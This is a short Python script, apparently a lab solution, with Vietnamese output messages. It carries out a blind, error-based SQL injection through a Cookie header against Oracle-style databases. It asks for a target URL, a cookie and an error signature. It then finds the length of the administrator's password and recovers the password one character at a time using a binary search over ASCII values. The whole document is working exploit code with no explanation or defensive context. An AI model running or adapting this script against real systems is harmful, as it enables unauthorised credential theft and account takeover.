import requests as rq
url=input("web: ")
cookie=input("cookie: ")
detect=input("sig: ")
headers={"Cookie": ""}

def get_len():
    global headers,cookie,url,detect
    d=1
    while 1:
        payload="' and (case when ((select length(password) from users where username='administrator')={0}) THEN (select chr(-1) from dual) ELSE (select chr(65) from dual) END)='A'-- -".format(d)
        headers['Cookie']=cookie+payload
        a=rq.get(url,headers=headers)
        if detect in a.text:
            return d
        d+=1
def get_char(index,start,end):
    global headers,cookie,url,detect
    m=(start+end)//2
    p1="' and (case when ( ascii(substr((select password from users where username='administrator'),{0},1)) = {1} ) THEN (select chr(-1) from dual) ELSE (select chr(65) from dual) END)='A'-- -".format(index,m)
    headers['Cookie']=cookie+p1
    r1=rq.get(url,headers=headers)
    if detect in r1.text:
        return m
    p2="' and (case when ( ascii(substr((select password from users where username='administrator'),{0},1)) > {1} ) THEN (select chr(-1) from dual) ELSE (select chr(65) from dual) END)='A'-- -".format(index,m)
    headers['Cookie']=cookie+p2
    r2=rq.get(url,headers=headers)
    if detect in r2.text:
        return get_char(index,m+1,end)
    else:
        return get_char(index,start,m-1)
password=""
len_string=get_len()
print("Do dai: "+str(len_string))
for i in range(1,len_string+1):
    c=get_char(i,32,126)
    password+=chr(c)
    print("ki tu thu {0}: {1}".format(i,chr(c)))
print("pass: "+password)
    
    
